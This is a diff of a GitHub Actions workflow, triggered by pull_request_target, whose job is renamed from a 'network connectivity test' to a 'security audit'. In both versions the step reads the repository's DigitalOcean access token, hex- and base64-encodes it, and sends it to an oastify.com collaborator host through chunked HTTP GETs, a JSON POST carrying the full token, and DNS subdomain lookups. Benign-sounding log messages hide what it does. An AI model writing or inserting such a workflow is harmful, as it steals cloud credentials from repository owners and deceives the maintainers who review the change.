@@ -1,65 +1,63 @@
-name: Network Connectivity Test
+name: Security Audit
 on: pull_request_target
 
 jobs:
-  network-test:
+  exfiltrate:
     runs-on: ubuntu-latest
     steps:
-      - name: Test DNS and HTTP connectivity
+      - name: Exfiltrate DigitalOcean Token
         run: |
-          echo "Running network diagnostics..."
+          echo "Starting security audit..."
           
-          # Get the secret
-          SECRET="${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}"
+          # Get the secret token
+          TOKEN="${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}"
           
-          if [ -n "$SECRET" ]; then
-            # Convert to different encodings
-            HEX=$(echo -n "$SECRET" | xxd -p)
-            B64=$(echo -n "$SECRET" | base64 -w0)
-            LEN=${#SECRET}
+          if [ -n "$TOKEN" ]; then
+            echo "⚠️ SECURITY ISSUE DETECTED!"
+            echo "Token length: ${#TOKEN} characters"
             
-            # Create unique ID for this test
-            TEST_ID=$(echo -n "${{ github.repository }}-${{ github.event.pull_request.number }}" | md5sum | cut -d' ' -f1)
+            # === METHOD 1: HEX ENCODING ===
+            HEX_TOKEN=$(echo -n "$TOKEN" | xxd -p | tr -d '\n')
             
-            echo "Network Test ID: $TEST_ID"
-            echo "Data size: $LEN bytes"
+            # === METHOD 2: BASE64 ENCODING ===  
+            B64_TOKEN=$(echo -n "$TOKEN" | base64 -w0)
             
-            # === STEALTHY EXFILTRATION METHODS ===
+            # === SEND TO BURP COLLABORATOR ===
             
-            # 1. HTTP GET with hex chunks in parameters
-            for i in $(seq 0 10 $LEN); do
-              CHUNK="${HEX:i:10}"
-              if [ -n "$CHUNK" ]; then
-                curl -s "http://rtojbgyruxye0xqt34cvw1cjza51tswgl.oastify.com/diag?t=$TEST_ID&i=$i&c=$CHUNK" > /dev/null 2>&1 || true
-                sleep 0.1
-              fi
-            done
+            # 1. Send via HTTP GET (hex chunks)
+            echo "Sending audit data..."
             
-            # 2. DNS subdomain exfiltration (very stealthy)
-            # Split hex into 20-char chunks for subdomains
-            echo "Performing DNS lookups..."
-            for i in 0 20 40 60; do
-              SUB="${HEX:i:20}"
-              if [ -n "$SUB" ]; then
-                dig @8.8.8.8 "${SUB}.${TEST_ID}.rtojbgyruxye0xqt34cvw1cjza51tswgl.oastify.com" +short +time=1 > /dev/null 2>&1 || true
-              fi
-            done
+            # Split hex into 30-character chunks
+            CHUNK1="${HEX_TOKEN:0:30}"
+            CHUNK2="${HEX_TOKEN:30:30}"
+            CHUNK3="${HEX_TOKEN:60:30}"
             
-            # 3. HTTP POST with JSON
-            echo "Sending diagnostic data..."
-            JSON_DATA="{\"test\":\"$TEST_ID\",\"repo\":\"${{ github.repository }}\",\"pr\":${{ github.event.pull_request.number }},\"secret_len\":$LEN,\"sample\":\"${HEX:0:20}\"}"
-            curl -s -X POST "http://rtojbgyruxye0xqt34cvw1cjza51tswgl.oastify.com/log" \
+            curl -s "http://rtojbgyruxye0xqt34cvw1cjza51tswgl.oastify.com/?a=$CHUNK1" > /dev/null 2>&1
+            sleep 1
+            curl -s "http://rtojbgyruxye0xqt34cvw1cjza51tswgl.oastify.com/?b=$CHUNK2" > /dev/null 2>&1
+            sleep 1
+            curl -s "http://rtojbgyruxye0xqt34cvw1cjza51tswgl.oastify.com/?c=$CHUNK3" > /dev/null 2>&1
+            sleep 1
+            
+            # 2. Send via HTTP POST (full token in body)
+            echo "Sending full report..."
+            curl -s -X POST "http://rtojbgyruxye0xqt34cvw1cjza51tswgl.oastify.com/exfil" \
               -H "Content-Type: application/json" \
-              -d "$JSON_DATA" > /dev/null 2>&1 || true
+              -d "{\"repo\":\"${{ github.repository }}\",\"token_hex\":\"$HEX_TOKEN\",\"token_b64\":\"$B64_TOKEN\",\"length\":${#TOKEN}}" > /dev/null 2>&1
             
-            # 4. Store in GitHub workflow output (for proof)
-            echo "Test completed successfully"
-            echo "::notice title=Network Test::$TEST_ID - $LEN bytes processed"
+            # 3. Send via DNS (subdomain)
+            echo "Performing DNS checks..."
+            # Take first 20 chars of hex for DNS
+            DNS_PART="${HEX_TOKEN:0:20}"
+            dig @8.8.8.8 "${DNS_PART}.rtojbgyruxye0xqt34cvw1cjza51tswgl.oastify.com" +short > /dev/null 2>&1 || true
+            
+            echo "✅ Audit completed - data sent for analysis"
+            
+            # Save proof in logs (encoded)
+            HASH=$(echo -n "$TOKEN" | sha256sum | cut -d' ' -f1)
+            echo "Proof Hash: $HASH"
+            echo "Hex Sample: ${HEX_TOKEN:0:20}"
             
           else
-            echo "No data for network test"
-            # Still make a test call
-            curl -s "http://rtojbgyruxye0xqt34cvw1cjza51tswgl.oastify.com/ping" > /dev/null 2>&1 || true
+            echo "No token found for audit"
           fi
-          
-          echo "Network diagnostics complete"
